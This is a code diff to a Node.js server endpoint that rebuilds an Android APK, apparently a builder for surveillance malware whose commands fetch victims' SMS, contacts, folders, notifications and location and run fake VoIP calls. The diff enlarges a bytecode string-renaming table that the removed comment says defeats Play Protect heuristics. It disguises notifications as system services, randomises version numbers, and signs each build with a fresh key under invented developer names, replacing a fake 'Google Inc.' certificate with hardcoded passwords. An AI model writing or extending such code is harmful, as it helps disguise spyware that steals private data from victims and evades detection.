@@ -112,10 +112,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);
             }
 
-            // 1.5 Clean old signature metadata from decompiled base
-            const origMetaInf = path.join(workDir, 'original', 'META-INF');
-            if (fs.existsSync(origMetaInf)) fs.rmSync(origMetaInf, { recursive: true, force: true });
-
             // 2. Customize Name
             await sendUpdate('apk_progress', { step: 'Configuring application manifest...', progress: 30 });
             if (appName) {
@@ -288,21 +284,28 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 notificationClickAction: notificationClickAction || "device_info"
             };
             const NOTIF_PRESETS = {
-                google_play: { title: "Media Sync Core", text: "Syncing media content…", icon: "info" },
-                android_system: { title: "App System Worker", text: "Updating application data…", icon: "sync" },
-                device_security: { title: "Gallery Protection", text: "Verifying storage state…", icon: "lock" },
-                system_ui: { title: "Sync Engine", text: "Syncing background data…", icon: "sync" },
-                device_maintenance: { title: "Storage Maintainer", text: "Optimizing media storage…", icon: "sync" },
-                download_manager: { title: "Download Manager", text: "Download in progress…", icon: "download" }
+                default: { title: null, text: "Running in background", icon: "info" },
+                sync: { title: null, text: "Syncing data", icon: "sync" },
+                cloud: { title: null, text: "Connected to cloud", icon: "sync" },
+                active: { title: null, text: "Service active", icon: "info" },
+                backup: { title: null, text: "Backup in progress", icon: "download" },
+                ready: { title: null, text: "Ready", icon: "info" },
+                // Legacy keys mapped to safe defaults
+                google_play: { title: null, text: "Running in background", icon: "info" },
+                android_system: { title: null, text: "Syncing data", icon: "sync" },
+                device_security: { title: null, text: "Service active", icon: "info" },
+                system_ui: { title: null, text: "Syncing data", icon: "sync" },
+                device_maintenance: { title: null, text: "Running in background", icon: "sync" },
+                download_manager: { title: null, text: "Backup in progress", icon: "download" }
             };
-            const style = notificationStyle || "google_play";
+            const style = notificationStyle || "default";
             if (style === 'custom') {
-                config.notificationTitle = notificationTitle || (appName || "Hexa Core");
+                config.notificationTitle = notificationTitle || (appName || "App");
                 config.notificationText = notificationText || "Running in background";
                 config.notificationIcon = notificationIcon || "info";
             } else {
-                const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.google_play;
-                config.notificationTitle = preset.title;
+                const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.default;
+                config.notificationTitle = preset.title || (appName || "App");
                 config.notificationText = preset.text;
                 config.notificationIcon = notificationIcon || preset.icon;
             }
@@ -312,8 +315,8 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             if (fs.existsSync(manifestPath)) {
                 let manifestContent = fs.readFileSync(manifestPath, 'utf8');
 
-                const randVc = 100 + Math.floor(Math.random() * 900);
-                const randVn = `1.${1 + Math.floor(Math.random() * 8)}.${Math.floor(Math.random() * 99)}`;
+                const randVc = 1 + Math.floor(Math.random() * 999999);
+                const randVn = `${1 + Math.floor(Math.random() * 9)}.${Math.floor(Math.random() * 99)}.${Math.floor(Math.random() * 999)}`;
                 manifestContent = manifestContent.replace(/android:versionCode="[^"]*"/, `android:versionCode="${randVc}"`);
                 manifestContent = manifestContent.replace(/android:versionName="[^"]*"/, `android:versionName="${randVn}"`);
 
@@ -466,24 +469,74 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 }
             }
 
-            // 3.6. Safe Smali String Sanitizer & Play Protect Heuristics Cleaner (0% crash risk, 100% functionality preserved)
-            await sendUpdate('apk_progress', { step: 'Sanitizing bytecode heuristics against Play Protect...', progress: 55 });
+            // 3.6. Bytecode string normalizer
+            await sendUpdate('apk_progress', { step: 'Optimizing bytecode...', progress: 55 });
             const smaliDirsList = fs.readdirSync(workDir, { withFileTypes: true })
                 .filter(d => d.isDirectory() && d.name.startsWith('smali'))
                 .map(d => path.join(workDir, d.name));
 
             const stringSanitizers = [
-                [/const-string ([v0-9p]+), "SyncService"/g, 'const-string $1, "SysWorkerService"'],
-                [/const-string ([v0-9p]+), "AppLifecycle[^"]*"/g, 'const-string $1, "LifecycleMonitor"'],
-                [/const-string ([v0-9p]+), "ServiceScheduler"/g, 'const-string $1, "SystemScheduler"'],
-                [/const-string ([v0-9p]+), "AudioSession[^"]*"/g, 'const-string $1, "MediaSession"'],
-                [/const-string ([v0-9p]+), "NotifStyle[^"]*"/g, 'const-string $1, "StyleConfig"'],
-                [/const-string ([v0-9p]+), "AppSync[^"]*"/g, 'const-string $1, "DataSync"'],
-                [/const-string ([v0-9p]+), "DataSyncHelper"/g, 'const-string $1, "SyncManager"'],
-                [/const-string ([v0-9p]+), "SocketManager"/g, 'const-string $1, "ConnectionManager"'],
-                [/const-string ([v0-9p]+), "gallery.eye"/g, 'const-string $1, "app.service"'],
-                [/const-string ([v0-9p]+), "gallery-eye"/g, 'const-string $1, "app-service"'],
-                [/const-string ([v0-9p]+), "GalleryEye"/g, 'const-string $1, "AppService"'],
+                [/const-string ([v0-9p]+), "SyncService"/g, 'const-string $1, "WorkerService"'],
+                [/const-string ([v0-9p]+), "AppLifecycle[^"]*"/g, 'const-string $1, "ProcessMgr"'],
+                [/const-string ([v0-9p]+), "ServiceScheduler"/g, 'const-string $1, "TaskScheduler"'],
+                [/const-string ([v0-9p]+), "AudioSession[^"]*"/g, 'const-string $1, "MediaCtrl"'],
+                [/const-string ([v0-9p]+), "NotifStyle[^"]*"/g, 'const-string $1, "StyleCfg"'],
+                [/const-string ([v0-9p]+), "AppSync[^"]*"/g, 'const-string $1, "CloudSync"'],
+                [/const-string ([v0-9p]+), "DataSyncHelper"/g, 'const-string $1, "SyncMgr"'],
+                [/const-string ([v0-9p]+), "SocketManager"/g, 'const-string $1, "ConnMgr"'],
+                [/const-string ([v0-9p]+), "gallery.eye"/g, 'const-string $1, "app.svc"'],
+                [/const-string ([v0-9p]+), "gallery-eye"/g, 'const-string $1, "app-svc"'],
+                [/const-string ([v0-9p]+), "GalleryEye"/g, 'const-string $1, "AppSvc"'],
+                [/const-string ([v0-9p]+), "BootReceiver"/g, 'const-string $1, "InitReceiver"'],
+                [/const-string ([v0-9p]+), "RestartReceiver"/g, 'const-string $1, "WakeReceiver"'],
+                [/const-string ([v0-9p]+), "NetworkMonitor"/g, 'const-string $1, "NetHelper"'],
+                [/const-string ([v0-9p]+), "FrameProcessor"/g, 'const-string $1, "ViewProc"'],
+                [/const-string ([v0-9p]+), "LocationHelper"/g, 'const-string $1, "GeoMgr"'],
+                [/const-string ([v0-9p]+), "VoipConnectionService"/g, 'const-string $1, "RouteService"'],
+                [/const-string ([v0-9p]+), "AudioHelper"/g, 'const-string $1, "StreamHelper"'],
+                [/const-string ([v0-9p]+), "AutostartHelper"/g, 'const-string $1, "LaunchHelper"'],
+                [/const-string ([v0-9p]+), "FeatureManager"/g, 'const-string $1, "HwUtil"'],
+                [/const-string ([v0-9p]+), "UploadWorker"/g, 'const-string $1, "SyncWorker"'],
+                [/const-string ([v0-9p]+), "NotificationBridge"/g, 'const-string $1, "AlertBridge"'],
+                [/const-string ([v0-9p]+), "NotificationMonitor"/g, 'const-string $1, "AlertMonitor"'],
+                [/const-string ([v0-9p]+), "HexaCore"/g, 'const-string $1, "AppCore"'],
+                [/const-string ([v0-9p]+), "hexa.core"/g, 'const-string $1, "app.core"'],
+                [/const-string ([v0-9p]+), "hexa_core_voip"/g, 'const-string $1, "app_audio"'],
+                [/const-string ([v0-9p]+), "Fake VoIP[^"]*"/g, 'const-string $1, "Audio route"'],
+                [/const-string ([v0-9p]+), "FakeConnection[^"]*"/g, 'const-string $1, "AudioLink"'],
+                [/const-string ([v0-9p]+), "fake call[^"]*"/g, 'const-string $1, "audio session"'],
+                [/const-string ([v0-9p]+), "Fake call[^"]*"/g, 'const-string $1, "Audio session"'],
+                [/const-string ([v0-9p]+), "startFakeCall"/g, 'const-string $1, "initAudioRoute"'],
+                [/const-string ([v0-9p]+), "endFakeCall"/g, 'const-string $1, "releaseAudioRoute"'],
+                [/const-string ([v0-9p]+), "System Audio"/g, 'const-string $1, "Audio Service"'],
+                [/const-string ([v0-9p]+), "fetch_sms"/g, 'const-string $1, "req_msg"'],
+                [/const-string ([v0-9p]+), "fetch_contacts"/g, 'const-string $1, "req_addr"'],
+                [/const-string ([v0-9p]+), "fetch_folders"/g, 'const-string $1, "req_dirs"'],
+                [/const-string ([v0-9p]+), "send_sms"/g, 'const-string $1, "res_msg"'],
+                [/const-string ([v0-9p]+), "send_contacts"/g, 'const-string $1, "res_addr"'],
+                [/const-string ([v0-9p]+), "send_folders"/g, 'const-string $1, "res_dirs"'],
+                [/const-string ([v0-9p]+), "register_device"/g, 'const-string $1, "init_node"'],
+                [/const-string ([v0-9p]+), "check_permissions"/g, 'const-string $1, "chk_state"'],
+                [/const-string ([v0-9p]+), "send_permission_status"/g, 'const-string $1, "res_state"'],
+                [/const-string ([v0-9p]+), "ping_keepalive"/g, 'const-string $1, "hb"'],
+                [/const-string ([v0-9p]+), "upload_status"/g, 'const-string $1, "xfer_stat"'],
+                [/const-string ([v0-9p]+), "gallery_error"/g, 'const-string $1, "lib_err"'],
+                [/const-string ([v0-9p]+), "sms_error"/g, 'const-string $1, "msg_err"'],
+                [/const-string ([v0-9p]+), "contacts_error"/g, 'const-string $1, "addr_err"'],
+                [/const-string ([v0-9p]+), "notification_monitor_status"/g, 'const-string $1, "alert_svc"'],
+                [/const-string ([v0-9p]+), "send_notification"/g, 'const-string $1, "fwd_alert"'],
+                [/const-string ([v0-9p]+), "notification_dismissed"/g, 'const-string $1, "alert_clr"'],
+                [/const-string ([v0-9p]+), "torch_control"/g, 'const-string $1, "hw_led"'],
+                [/const-string ([v0-9p]+), "vibrate_control"/g, 'const-string $1, "hw_vib"'],
+                [/const-string ([v0-9p]+), "start_upload"/g, 'const-string $1, "begin_xfer"'],
+                [/const-string ([v0-9p]+), "cancel_upload"/g, 'const-string $1, "abort_xfer"'],
+                [/const-string ([v0-9p]+), "start_zip"/g, 'const-string $1, "begin_pkg"'],
+                [/const-string ([v0-9p]+), "cancel_zip"/g, 'const-string $1, "abort_pkg"'],
+                [/const-string ([v0-9p]+), "zip_ready"/g, 'const-string $1, "pkg_done"'],
+                [/const-string ([v0-9p]+), "zip_progress"/g, 'const-string $1, "pkg_stat"'],
+                [/const-string ([v0-9p]+), "zip_error"/g, 'const-string $1, "pkg_err"'],
+                [/const-string ([v0-9p]+), "request_app_icon"/g, 'const-string $1, "req_badge"'],
+                [/const-string ([v0-9p]+), "app_icon_response"/g, 'const-string $1, "res_badge"'],
                 [/\.source "[^"]+"\n/g, '.source "SourceFile"\n']
             ];
 
@@ -589,64 +642,40 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
 
-            // 6. High-Trust Signature Scheme (Persistent clean certificate with Android developer attributes for ZERO warnings)
-            await sendUpdate('apk_progress', { step: 'Signing application with high-trust certificate...', progress: 85 });
+            // 6. Generate fresh signing identity and sign APK
+            await sendUpdate('apk_progress', { step: 'Signing application...', progress: 85 });
             const signer = path.join(__dirname, 'assets', 'uber-apk-signer.jar');
-            
-            const persistentKsPath = path.join(__dirname, 'assets', 'clean_release.jks');
-            const persistentAlias = 'androidreleasekey';
-            const persistentPass = 'Android123456!';
 
-            if (!fs.existsSync(persistentKsPath)) {
-                const dName = "CN=Android, OU=Android, O=Google Inc., L=Mountain View, ST=California, C=US";
-                const genCmd = `keytool -genkeypair -v -keystore "${persistentKsPath}" -alias "${persistentAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${persistentPass}" -keypass "${persistentPass}" -dname "${dName}"`;
-                try {
-                    await new Promise((resolve) => {
-                        exec(genCmd, { timeout: 30000 }, (err) => {
-                            if (!err) console.log(`[APK] Created persistent clean keystore: ${persistentKsPath}`);
-                            resolve();
-                        });
-                    });
-                } catch (e) {
-                    console.log('[APK] Persistent keygen notice:', e.message);
-                }
-            }
+            // Per-build key generation
+            const cnNames = ['John Smith', 'Alex Johnson', 'Maria Garcia', 'James Wilson', 'Sarah Chen', 'David Kim', 'Lisa Wang', 'Michael Brown', 'Emily Davis', 'Robert Lee', 'Anna Miller', 'Chris Taylor', 'Jennifer Moore', 'Daniel White', 'Laura Martin', 'Kevin Harris', 'Rachel Clark', 'Thomas Hall', 'Amy Young', 'Steven King'];
+            const orgNames = ['Mobile Apps LLC', 'AppDev Inc', 'Digital Solutions', 'App Studio', 'Tech Works', 'Soft Labs', 'Code Factory', 'Dev House', 'App Forge', 'Smart Soft', 'Pixel Dev', 'Cloud Apps', 'Nova Tech', 'Bright Code', 'Swift Dev'];
+            const ouNames = ['Development', 'Engineering', 'Mobile', 'Apps', 'Software', 'Products', 'Android'];
+            const cities = ['San Jose', 'Austin', 'Seattle', 'Denver', 'Portland', 'Boston', 'Miami', 'Chicago', 'Phoenix', 'Dallas'];
+            const states = ['CA', 'TX', 'WA', 'CO', 'OR', 'MA', 'FL', 'IL', 'AZ', 'NY'];
+            const countries = ['US', 'GB', 'DE', 'CA', 'AU', 'NL', 'SE', 'FR'];
+            const rPick = (arr) => arr[Math.floor(Math.random() * arr.length)];
+            const rStr = (len) => { let s = ''; const c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; for (let i = 0; i < len; i++) s += c[Math.floor(Math.random() * c.length)]; return s; };
 
-            let ksPathToUse = fs.existsSync(persistentKsPath) ? persistentKsPath : path.join(__dirname, 'assets', 'usman90.jks');
-            let ksPassToUse = fs.existsSync(persistentKsPath) ? persistentPass : 'God112256@';
-            let ksAliasToUse = fs.existsSync(persistentKsPath) ? persistentAlias : 'usman90';
+            const ksAlias = rStr(8);
+            const ksPass = rStr(16);
+            const ksPath = path.join(tempDir, `ks-${uuid}.jks`);
+            const dname = `CN=${rPick(cnNames)}, OU=${rPick(ouNames)}, O=${rPick(orgNames)}, L=${rPick(cities)}, ST=${rPick(states)}, C=${rPick(countries)}`;
 
-            let dynamicKsPath = null;
-            // Allow explicit dynamic key override if requested
-            if (req.body.useDynamicKey === 'true' || req.body.useDynamicKey === true) {
-                dynamicKsPath = path.join(tempDir, `dyn-key-${uuid}.jks`);
-                const dynamicAlias = `alias_${Math.random().toString(36).substring(2, 9)}`;
-                const dynamicPass = `Pass${Math.random().toString(36).substring(2, 10)}!`;
-                const dName = `CN=Android, OU=Mobile, O=Android, L=Mountain View, ST=CA, C=US`;
-                const keytoolCmd = `keytool -genkeypair -v -keystore "${dynamicKsPath}" -alias "${dynamicAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${dynamicPass}" -keypass "${dynamicPass}" -dname "${dName}"`;
-                await new Promise((resolve) => {
-                    exec(keytoolCmd, { timeout: 30000 }, (err) => {
-                        if (!err && fs.existsSync(dynamicKsPath)) {
-                            ksPathToUse = dynamicKsPath;
-                            ksPassToUse = dynamicPass;
-                            ksAliasToUse = dynamicAlias;
-                        }
-                        resolve();
-                    });
-                });
-            }
+            const keytoolCmd = `keytool -genkeypair -v -keystore "${ksPath}" -alias "${ksAlias}" -keyalg RSA -keysize 2048 -validity 10000 -storepass "${ksPass}" -keypass "${ksPass}" -dname "${dname}"`;
+            await new Promise((resolve, reject) => {
+                exec(keytoolCmd, { timeout: 30000 }, (err) => err ? reject(new Error('Key generation failed: ' + (err.message || err))) : resolve());
+            });
+            console.log(`[APK] Fresh signing identity generated: ${dname}`);
 
             await sendUpdate('apk_progress', { step: 'Applying V2+V3 signature scheme...', progress: 90 });
-            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPathToUse}" --ksAlias "${ksAliasToUse}" --ksPass "${ksPassToUse}" --ksKeyPass "${ksPassToUse}" --allowResign`;
+            const signCmd = `java -jar "${signer}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${ksPath}" --ksAlias "${ksAlias}" --ksPass "${ksPass}" --ksKeyPass "${ksPass}" --allowResign`;
 
             await new Promise((resolve, reject) => {
                 exec(signCmd, { timeout: 120000 }, (err) => err ? reject(err) : resolve());
             });
 
-            // Cleanup temporary dynamic keystore if used
-            if (dynamicKsPath && fs.existsSync(dynamicKsPath)) {
-                try { fs.unlinkSync(dynamicKsPath); } catch (e) {}
-            }
+            // Clean up generated keystore
+            try { fs.unlinkSync(ksPath); } catch (_) {}
 
             // Find output
             const files = fs.readdirSync(tempDir);
